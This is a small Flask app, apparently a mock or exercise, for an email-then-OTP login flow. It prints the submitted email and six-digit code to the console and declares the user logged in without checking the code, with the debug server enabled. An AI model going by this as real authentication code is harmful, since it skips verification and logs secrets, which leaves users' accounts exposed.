from flask import Flask, redirect, render_template, request, url_for

app = Flask(__name__)

@app.route('/', methods=['GET', 'POST'])
def index():
    if request.method == 'POST':
        email = request.form.get('email')
        print(f"Received email: {email}")

        return redirect(url_for('otp'))

    return render_template('index.html')

@app.route('/verification',methods=['GET','POST'])
def otp():
    if request.method == 'POST':
        otp_1 = request.form.get('otp1')
        otp_2 = request.form.get('otp2')
        otp_3 = request.form.get('otp3')
        otp_4 = request.form.get('otp4')
        otp_5 = request.form.get('otp5')
        otp_6 = request.form.get('otp6')

       

        print(f"Received OTP: {str(otp_1)+ str(otp_2)+ str(otp_3)+ str(otp_4)+ str(otp_5)+ str(otp_6)}")

        return f" The Dashboard is logged In"

    return render_template('otp.html')

if __name__ == '__main__':
    app.run(debug=True, port=5500)